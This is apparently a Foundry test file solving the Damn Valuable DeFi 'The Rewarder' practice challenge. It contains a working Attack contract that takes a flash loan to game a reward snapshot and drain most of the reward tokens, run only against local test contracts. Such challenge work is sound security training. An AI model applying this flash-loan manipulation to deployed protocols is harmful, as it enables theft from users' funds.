// SPDX-License-Identifier: MIT

pragma solidity ^0.8.0;

import {Test, console} from "forge-std/Test.sol";
import "@openzeppelin/contracts/utils/Address.sol";
import "@openzeppelin/contracts/utils/Strings.sol";
import "../src/contracts/TheRewarderPool.sol";
import "../src/contracts/FlashLoanerPool.sol";

contract TheRewarderPoolExploits is Test {
    address attacker = makeAddr("attacker");

    address flashLoaner = makeAddr("flashLoaner");

    uint256 constant AMOUNT_TO_DEPOSIT = 25;
    uint256 constant FLASH_LOAN_POOL_AMOUNT = 100_000_000;

    TheRewarderPool rewarderPool;
    DamnValuableToken liquidityToken;
    RewardToken rewardToken;
    FlashLoanerPool flashLoanPool;

    // Attack attack;

    constructor() {
        // Initialize Token
        liquidityToken = new DamnValuableToken();

        // Initialize Rewarder Pool
        rewarderPool = new TheRewarderPool(address(liquidityToken));
        rewardToken = rewarderPool.rewardToken();

        // Initialize Flash Loan Pool
        flashLoanPool = new FlashLoanerPool(address(liquidityToken));

        deal(address(liquidityToken), flashLoaner, FLASH_LOAN_POOL_AMOUNT);
        
        vm.startPrank(flashLoaner);
        liquidityToken.approve(address(flashLoanPool), FLASH_LOAN_POOL_AMOUNT);
        liquidityToken.transfer(address(flashLoanPool), FLASH_LOAN_POOL_AMOUNT);

        // Enter 4 players
        for (uint256 i = 0; i < 4; i++) {
            string memory playerName = string.concat("player", Strings.toString(i));
            address player = makeAddr(playerName);
            deal(address(liquidityToken), player, AMOUNT_TO_DEPOSIT);

            vm.startPrank(player);
            liquidityToken.approve(address(rewarderPool), AMOUNT_TO_DEPOSIT);
            rewarderPool.deposit(25);
        }
    }

    function testHappyPath() external {
        vm.warp(block.timestamp + 5 days);

        // Distribute rewards for first round
        for (uint256 i = 0; i < 4; i++) {
            string memory playerName = string.concat("player", Strings.toString(i));
            address player = makeAddr(playerName);

            vm.startPrank(player);
            rewarderPool.distributeRewards();
            rewarderPool.withdraw(AMOUNT_TO_DEPOSIT);

            assertEq(rewardToken.balanceOf(player), AMOUNT_TO_DEPOSIT * 10 ** 18);
        }
    }

    function testAttack() external {
        vm.warp(block.timestamp + 5 days);

        vm.startPrank(attacker);

        Attack attack = new Attack(rewarderPool, flashLoanPool, liquidityToken, rewardToken);
        attack.attack(FLASH_LOAN_POOL_AMOUNT);
        attack.withdraw();

        uint256 expectedWinnings = AMOUNT_TO_DEPOSIT * 5 * 10 ** 18;
        assertApproxEqAbs(rewardToken.balanceOf(attacker), expectedWinnings, expectedWinnings * 9 / 10);
    }
}

contract Attack {
    using Address for address payable;

    TheRewarderPool rewarderPool;
    FlashLoanerPool flashLoanPool;
    DamnValuableToken liquidityToken;
    RewardToken rewardToken;
    address owner;

    constructor(
        TheRewarderPool _rewarderPool,
        FlashLoanerPool _flashLoanPool,
        DamnValuableToken _liquidityToken,
        RewardToken _rewardToken
    ) {
        // Initialize rewarderPool with 1000 ether
        rewarderPool = _rewarderPool;
        flashLoanPool = _flashLoanPool;
        liquidityToken = _liquidityToken;
        rewardToken = _rewardToken;

        owner = msg.sender;
    }

    function attack(uint256 amount) external {
        flashLoanPool.flashLoan(amount);
    }

    function receiveFlashLoan(uint256 amount) external {
        liquidityToken.approve(address(rewarderPool), amount);

        rewarderPool.deposit(amount);
        rewarderPool.distributeRewards();
        rewarderPool.withdraw(amount);

        liquidityToken.approve(address(flashLoanPool), amount);
        liquidityToken.transfer(address(flashLoanPool), amount);
    }

    function withdraw() external {
        uint256 amount = rewardToken.balanceOf(address(this));

        rewardToken.approve(address(owner), amount);
        rewardToken.transfer(address(owner), amount);
    }
}
